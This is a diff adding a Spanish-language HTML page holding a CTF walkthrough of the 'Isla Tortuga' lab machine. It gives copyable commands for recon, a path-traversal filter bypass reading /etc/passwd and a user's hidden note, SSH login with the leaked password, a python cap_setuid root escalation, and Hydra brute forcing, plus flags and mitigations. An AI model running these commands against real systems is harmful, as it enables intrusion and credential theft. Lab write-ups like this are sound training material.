@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Writeup · Isla Tortuga</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Pirata+One&family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+  :root{
+    --bg:#f4ecd8;--surface:#fbf6e9;--ink:#2a2118;--muted:#6b5d49;--line:#d8c7a2;
+    --accent:#0e6b5c;--accent-2:#b8872b;--term-bg:#0e1a2b;--term-fg:#d7e6df;--term-accent:#00ff99;--term-gold:#ffd700;--radius:12px;
+  }
+  @media (prefers-color-scheme:dark){:root{
+    --bg:#0b141f;--surface:#121f2e;--ink:#e7ddc8;--muted:#9fb0ab;--line:#24384a;
+    --accent:#3bd1b4;--accent-2:#e2ad4c;--term-bg:#060d16;--term-fg:#cfe3db;color-scheme:dark;}}
+  *{box-sizing:border-box}
+  body{background:var(--bg);color:var(--ink);font-family:Inter,system-ui,sans-serif;font-size:16px;line-height:1.6;margin:0}
+  .wrap{max-width:860px;margin:0 auto;padding:0 18px}
+  header.hero{text-align:center;padding:48px 0 24px}
+  .turtle{font-size:clamp(3.4rem,11vw,5.2rem);line-height:1}
+  h1{font-family:"Pirata One",serif;font-weight:400;font-size:clamp(2.6rem,9vw,4.4rem);margin:.1em 0 .05em;color:var(--accent)}
+  .sub{font-family:"Space Grotesk",sans-serif;font-weight:600;color:var(--accent-2);letter-spacing:.14em;text-transform:uppercase;font-size:.95rem}
+  .tagline{color:var(--muted);max-width:60ch;margin:.6em auto 0}
+  .meta{display:flex;flex-wrap:wrap;gap:10px;justify-content:center;margin-top:18px}
+  .chip{background:var(--surface);border:1px solid var(--line);border-radius:999px;padding:6px 14px;font-family:"JetBrains Mono",monospace;font-size:.8rem;color:var(--muted)}
+  .chip b{color:var(--ink)}
+  .legal{margin:22px auto 0;max-width:62ch;border:1px dashed var(--accent-2);background:rgba(184,135,43,.12);border-radius:var(--radius);padding:12px 16px;font-size:.85rem;color:var(--muted);text-align:left}
+  .legal b{color:var(--accent-2)}
+  section{margin:34px 0}
+  .step{display:flex;align-items:center;gap:14px;margin-bottom:6px}
+  .num{flex:none;width:42px;height:42px;border-radius:10px;background:var(--accent);color:#fff;display:grid;place-items:center;font-family:"Space Grotesk",sans-serif;font-weight:700;font-size:1.2rem}
+  h2{font-family:"Space Grotesk",sans-serif;font-weight:700;font-size:clamp(1.3rem,4vw,1.7rem);margin:0;color:var(--ink)}
+  .goal{color:var(--muted);margin:2px 0 16px 56px;font-size:.92rem}
+  @media(max-width:520px){.goal{margin-left:0}}
+  .why{border-left:3px solid var(--accent-2);padding:2px 0 2px 14px;margin:14px 0;color:var(--muted)}
+  .why b{color:var(--ink)}
+  a{color:var(--accent)}
+  code.inl{font-family:"JetBrains Mono",monospace;background:rgba(14,107,92,.14);padding:1px 6px;border-radius:5px;font-size:.88em;color:var(--ink);word-break:break-word}
+  .cmd{background:var(--term-bg);border:1px solid #1d3346;border-radius:var(--radius);margin:14px 0;overflow:hidden}
+  .cmd .bar{display:flex;align-items:center;gap:8px;padding:8px 12px;border-bottom:1px solid #1d3346;background:rgba(255,255,255,.03)}
+  .dot{width:11px;height:11px;border-radius:50%}.d1{background:#ff5f56}.d2{background:#ffbd2e}.d3{background:#27c93f}
+  .bar .lbl{margin-left:6px;font-family:"JetBrains Mono",monospace;font-size:.72rem;color:#7e93a0}
+  .copy{margin-left:auto;font-family:"Space Grotesk",sans-serif;font-size:.74rem;font-weight:600;color:var(--term-accent);background:transparent;border:1px solid #2a4a5c;border-radius:7px;padding:5px 11px;cursor:pointer}
+  .copy:hover{background:#13293a}.copy.ok{color:#0e1a2b;background:var(--term-accent);border-color:var(--term-accent)}
+  .cmd pre{margin:0;padding:14px 16px;overflow-x:auto;font-family:"JetBrains Mono",monospace;font-size:.84rem;line-height:1.7;color:var(--term-fg);white-space:pre}
+  .cmd pre .c{color:#6f8a97}.cmd pre .p{color:var(--term-gold)}.cmd pre .o{color:#8fb9ab}.cmd pre .h{color:var(--term-accent);font-weight:700}
+  .flags{display:grid;grid-template-columns:1fr;gap:12px}
+  @media(min-width:560px){.flags{grid-template-columns:1fr 1fr}}
+  .flag{background:var(--surface);border:1px solid var(--line);border-radius:var(--radius);padding:14px 16px}
+  .flag .t{font-family:"Space Grotesk";font-weight:700;color:var(--accent);font-size:.78rem;letter-spacing:.1em;text-transform:uppercase}
+  .flag .v{font-family:"JetBrains Mono",monospace;margin-top:6px;word-break:break-all;color:var(--ink);font-weight:500}
+  table{width:100%;border-collapse:collapse;font-size:.86rem}
+  .tscroll{overflow-x:auto;border:1px solid var(--line);border-radius:var(--radius)}
+  th,td{text-align:left;padding:10px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+  th{font-family:"Space Grotesk";background:var(--surface);color:var(--muted);text-transform:uppercase;font-size:.72rem}
+  td code{font-family:"JetBrains Mono",monospace;font-size:.82em;color:var(--accent)}
+  tr:last-child td{border-bottom:none}
+  footer{margin:40px 0 24px;text-align:center;color:var(--muted);font-size:.82rem;border-top:1px solid var(--line);padding-top:18px}
+  ul{margin-left:56px}@media(max-width:520px){ul{margin-left:18px}}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <header class="hero">
+    <div class="turtle">🐢</div>
+    <div class="sub">Writeup · CTF · The Hackers Labs</div>
+    <h1>Isla Tortuga</h1>
+    <p class="tagline">Guía paso a paso, de reconocimiento a <b>root</b>. Cada comando tiene su botón de copiar.</p>
+    <div class="meta">
+      <span class="chip">Objetivo: <b>192.168.100.76</b></span>
+      <span class="chip">SO: <b>Debian 12</b></span>
+      <span class="chip">Puertos: <b>22, 80</b></span>
+    </div>
+    <div class="legal"><b>⚓ Aviso:</b> máquina de laboratorio propia y aislada. Usa estas técnicas solo sobre sistemas para los que tengas autorización explícita.</div>
+  </header>
+
+  <div class="cmd"><div class="bar"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="lbl">preparación</span><button class="copy">Copiar</button></div>
+<pre><span class="c"># Guarda la IP objetivo en una variable</span>
+export T=192.168.100.76
+mkdir -p ~/tortuga/recon && cd ~/tortuga/recon</pre></div>
+
+  <section>
+    <div class="step"><div class="num">1</div><h2>Descubrimiento de red</h2></div>
+    <p class="goal">Localizar la máquina objetivo en el segmento de red.</p>
+    <div class="cmd"><div class="bar"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="lbl">nmap · host discovery</span><button class="copy">Copiar</button></div>
+<pre>nmap -sn 192.168.100.0/24 -oN hosts.txt
+sudo arp-scan -I eth0 --localnet</pre></div>
+  </section>
+
+  <section>
+    <div class="step"><div class="num">2</div><h2>Escaneo de puertos y servicios</h2></div>
+    <p class="goal">Enumerar puertos, versiones y SO.</p>
+    <div class="cmd"><div class="bar"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="lbl">nmap</span><button class="copy">Copiar</button></div>
+<pre>nmap -p- --open -sS --min-rate 3000 -n -Pn $T -oN allports.txt
+sudo nmap -p22,80 -sCV -O -n -Pn $T -oN services.txt</pre></div>
+    <div class="cmd"><div class="bar"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="lbl">resultado</span><button class="copy">Copiar</button></div>
+<pre><span class="o">22/tcp open ssh     OpenSSH 9.2p1 Debian 2+deb12u7</span>
+<span class="o">80/tcp open http    Apache httpd 2.4.62 ((Debian))  -> "Isla Tortuga"</span></pre></div>
+  </section>
+
+  <section>
+    <div class="step"><div class="num">3</div><h2>Footprinting web</h2></div>
+    <p class="goal">Revisar la web a mano y con herramientas.</p>
+    <div class="cmd"><div class="bar"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="lbl">enumeración web</span><button class="copy">Copiar</button></div>
+<pre>curl -i http://$T/
+whatweb -a 3 http://$T
+gobuster dir -u http://$T -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak -t 50
+curl -s http://$T/mapa.php
+curl -s http://$T/tripulacion.php</pre></div>
+    <p class="why"><b>Pistas:</b> <code class="inl">mapa.php</code> menciona a <b>grumete</b> y una "nota oculta en tu camarote"; <code class="inl">tripulacion.php</code> esconde: <i>"el viejo truco de las rutas dobles siempre funciona"</i> → path traversal con filtro evadible (<code class="inl">....//</code>).</p>
+  </section>
+
+  <section>
+    <div class="step"><div class="num">4</div><h2>Descubrir el parámetro LFI</h2></div>
+    <p class="goal">Encontrar el parámetro vulnerable y el payload de evasión.</p>
+    <div class="cmd"><div class="bar"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="lbl">ffuf · fuzzing de parámetros</span><button class="copy">Copiar</button></div>
+<pre>ffuf -u "http://$T/mapa.php?FUZZ=....//....//....//....//etc/passwd" \
+  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+  -mr "root:x:0:0" -t 50
+<span class="c"># ==> parámetro:</span> <span class="h">filename</span></pre></div>
+    <p class="why"><b>Truco de "rutas dobles":</b> el código hace <code class="inl">str_replace('../','',$f)</code>. <code class="inl">....//</code> contiene un <code class="inl">../</code> en medio; al borrarlo queda <code class="inl">../</code>. Filtro evadido.</p>
+  </section>
+
+  <section>
+    <div class="step"><div class="num">5</div><h2>Explotar el LFI</h2></div>
+    <p class="goal">Leer ficheros del sistema y enumerar usuarios.</p>
+    <div class="cmd"><div class="bar"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="lbl">LFI · /etc/passwd</span><button class="copy">Copiar</button></div>
+<pre>curl -s "http://$T/mapa.php?filename=....//....//....//....//etc/passwd"</pre></div>
+    <div class="cmd"><div class="bar"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="lbl">usuarios con shell</span><button class="copy">Copiar</button></div>
+<pre><span class="h">capitan:x:1001:1001::/home/capitan:/bin/bash</span>
+<span class="h">grumete:x:1002:1002::/home/grumete:/bin/bash</span></pre></div>
+  </section>
+
+  <section>
+    <div class="step"><div class="num">6</div><h2>Leer la nota oculta del grumete</h2></div>
+    <p class="goal">"nota oculta en tu camarote" = dotfile <code class="inl">.nota.txt</code>.</p>
+    <div class="cmd"><div class="bar"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="lbl">LFI · dotfile</span><button class="copy">Copiar</button></div>
+<pre>curl -s "http://$T/mapa.php?filename=....//....//....//....//home/grumete/.nota.txt"</pre></div>
+    <div class="cmd"><div class="bar"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="lbl">contenido</span><button class="copy">Copiar</button></div>
+<pre><span class="o">La puerta de la cámara del timón está asegurada con la contraseña:</span>
+    <span class="h">"mar_de_fuego123"</span>
+<span class="o">— El Capitán</span></pre></div>
+    <p class="why"><b>Credencial en texto plano.</b> La escribe "El Capitán" → se prueba contra el usuario <code class="inl">capitan</code>.</p>
+  </section>
+
+  <section>
+    <div class="step"><div class="num">7</div><h2>Acceso inicial por SSH (capitan)</h2></div>
+    <p class="goal">Primera shell con la contraseña robada.</p>
+    <div class="cmd"><div class="bar"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="lbl">ssh · foothold</span><button class="copy">Copiar</button></div>
+<pre>ssh capitan@$T
+<span class="c"># Contraseña:</span> <span class="h">mar_de_fuego123</span>
+<span class="p">capitan@TheHackersLabs-Tortuga:~$</span> id
+<span class="o">uid=1001(capitan) gid=1001(capitan)</span></pre></div>
+  </section>
+
+  <section>
+    <div class="step"><div class="num">8</div><h2>Escalada a root (Linux Capabilities)</h2></div>
+    <p class="goal">Buscar capabilities peligrosas y abusar de ellas.</p>
+    <div class="cmd"><div class="bar"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="lbl">getcap</span><button class="copy">Copiar</button></div>
+<pre>/usr/sbin/getcap -r / 2>/dev/null
+<span class="c"># Resultado:</span> <span class="h">/usr/bin/python3.11 cap_setuid=ep</span></pre></div>
+    <div class="cmd"><div class="bar"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="lbl">GTFOBins · python</span><button class="copy">Copiar</button></div>
+<pre>/usr/bin/python3.11 -c 'import os; os.setuid(0); os.execl("/bin/bash","bash")'
+<span class="p">root@TheHackersLabs-Tortuga:~#</span> id
+<span class="h">uid=0(root)</span></pre></div>
+    <p class="why"><b>¿Por qué?</b> <code class="inl">cap_setuid=ep</code> da a python la syscall <code class="inl">setuid(2)</code> a nivel de fichero, sin SUID ni sudo. Ref: <a href="https://gtfobins.github.io/gtfobins/python/#capabilities" target="_blank" rel="noopener">GTFOBins · python</a>.</p>
+  </section>
+
+  <section>
+    <div class="step"><div class="num">9</div><h2>Bonus: fuerza bruta de grumete</h2></div>
+    <p class="goal">Camino alternativo con Hydra (contraseña débil).</p>
+    <div class="cmd"><div class="bar"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="lbl">hydra · ssh</span><button class="copy">Copiar</button></div>
+<pre>hydra -l grumete -P /usr/share/wordlists/rockyou.txt ssh://$T -I -f -t 32
+<span class="c"># login: grumete   password:</span> <span class="h">1234</span>
+<span class="c"># si rockyou está comprimido:</span>
+sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz</pre></div>
+  </section>
+
+  <section>
+    <div class="step"><div class="num">10</div><h2>Flags</h2></div>
+    <div class="cmd"><div class="bar"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="lbl">capturar flags</span><button class="copy">Copiar</button></div>
+<pre>cat /home/grumete/user.txt
+cat /root/root.txt</pre></div>
+    <div class="flags">
+      <div class="flag"><div class="t">🏴‍☠️ user.txt (grumete)</div><div class="v">26411abdb6301c1d28617bd5ac7ec81b</div></div>
+      <div class="flag"><div class="t">👑 root.txt</div><div class="v">c3f63456632bd27e1d5602827c2b59ae</div></div>
+    </div>
+  </section>
+
+  <section>
+    <div class="step"><div class="num">★</div><h2>Resumen de la cadena</h2></div>
+    <div class="tscroll"><table>
+      <thead><tr><th>Fase</th><th>Vector</th><th>Comando / clave</th></tr></thead>
+      <tbody>
+        <tr><td>Recon</td><td>nmap</td><td><code>nmap -p- -sCV $T</code></td></tr>
+        <tr><td>Web</td><td>Footprinting</td><td><code>mapa.php</code>, <code>tripulacion.php</code></td></tr>
+        <tr><td>LFI</td><td>Path traversal c/ filtro</td><td><code>?filename=....//...//etc/passwd</code></td></tr>
+        <tr><td>Loot</td><td>Nota oculta</td><td><code>.nota.txt</code> → <code>mar_de_fuego123</code></td></tr>
+        <tr><td>Foothold</td><td>SSH</td><td><code>capitan : mar_de_fuego123</code></td></tr>
+        <tr><td>PrivEsc</td><td>Linux capability</td><td><code>python3.11 cap_setuid=ep</code> → root</td></tr>
+        <tr><td>Bonus</td><td>Fuerza bruta SSH</td><td><code>grumete : 1234</code></td></tr>
+      </tbody>
+    </table></div>
+  </section>
+
+  <section>
+    <div class="step"><div class="num">⚑</div><h2>Mitigaciones</h2></div>
+    <ul>
+      <li><b>LFI:</b> lista blanca + <code class="inl">basename()</code>; nunca sanear con un simple <code class="inl">str_replace</code>.</li>
+      <li><b>Credenciales:</b> no guardar contraseñas en notas/ficheros de texto.</li>
+      <li><b>Capability:</b> <code class="inl">getcap -r /</code> y quitar las innecesarias: <code class="inl">setcap -r /usr/bin/python3.11</code>.</li>
+      <li><b>SSH:</b> contraseñas robustas + clave pública (<code class="inl">PasswordAuthentication no</code>).</li>
+    </ul>
+  </section>
+
+  <footer>🐢 Isla Tortuga · The Hackers Labs · Uso educativo · Sustituye <code class="inl">$T</code> por la IP de tu laboratorio.</footer>
+</div>
+
+<script>
+  document.querySelectorAll('.copy').forEach(function(btn){
+    btn.addEventListener('click',function(){
+      var pre=btn.closest('.cmd').querySelector('pre');
+      var text=pre.innerText.replace(/ /g,' ');
+      var done=function(){btn.textContent='¡Copiado!';btn.classList.add('ok');setTimeout(function(){btn.textContent='Copiar';btn.classList.remove('ok');},1400);};
+      if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(text).then(done).catch(function(){sel(pre);});}else{sel(pre);}
+      function sel(node){var r=document.createRange();r.selectNodeContents(node);var s=getSelection();s.removeAllRanges();s.addRange(r);try{document.execCommand('copy');done();}catch(e){}}
+    });
+  });
+</script>
+</body>
+</html>
